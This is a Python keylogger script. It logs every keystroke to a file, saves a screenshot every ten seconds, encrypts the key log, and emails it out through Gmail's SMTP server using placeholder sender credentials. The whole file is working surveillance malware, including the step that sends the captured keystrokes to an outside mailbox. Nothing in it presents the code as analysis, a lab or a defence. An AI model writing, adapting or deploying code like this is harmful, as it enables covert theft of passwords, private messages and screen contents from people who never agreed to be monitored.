from pynput import keyboard
import threading, time, os
from datetime import datetime
import pyautogui
from cryptography.fernet import Fernet
import smtplib
from email.message import EmailMessage

LOG_DIR = "keylogger_logs"
os.makedirs(LOG_DIR, exist_ok=True)
key_log_file = os.path.join(LOG_DIR, "keys.txt")
screenshot_dir = os.path.join(LOG_DIR, "screens")
os.makedirs(screenshot_dir, exist_ok=True)

KEY_FILE = "secret.key"
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key
def load_key():
    return open(KEY_FILE, "rb").read()

if not os.path.exists(KEY_FILE):
    key = generate_key()
else:
    key = load_key()
cipher = Fernet(key)

def on_press(key):
    try:
        with open(key_log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(key_log_file, "a") as f:
            f.write(f" [{key}] ")

def screenshot_loop():
    while True:
        filename = datetime.now().strftime("screen_%Y%m%d_%H%M%S.png")
        path = os.path.join(screenshot_dir, filename)
        pyautogui.screenshot(path)
        time.sleep(10)

def encrypt_logs():
    with open(key_log_file, "rb") as f:
        data = f.read()
    encrypted = cipher.encrypt(data)
    with open(key_log_file + ".enc", "wb") as f:
        f.write(encrypted)

def send_email():
    email_sender = "yourmail@gmail.com"
    email_password = "your_app_password"
    email_receiver = "receiver@gmail.com"

    msg = EmailMessage()
    msg["Subject"] = "Keylogger Logs"
    msg["From"] = email_sender
    msg["To"] = email_receiver
    msg.set_content("Encrypted log file attached.")

    with open(key_log_file + ".enc", "rb") as f:
        msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename="keys.enc")

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(email_sender, email_password)
        smtp.send_message(msg)

screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
screenshot_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        encrypt_logs()
        send_email()  # optional
